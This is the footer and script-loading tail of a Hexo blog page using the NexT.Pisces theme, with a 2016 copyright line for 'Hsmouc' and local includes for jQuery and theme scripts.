  &copy; 
  <span itemprop="copyrightYear">2016</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Hsmouc</span>
</div>

<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
</div>

<div class="theme-info">
  主题 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Pisces
  </a>
</div>

        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  



  
  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>



  



  




  
  

  

  

  

  


</body>
</html>
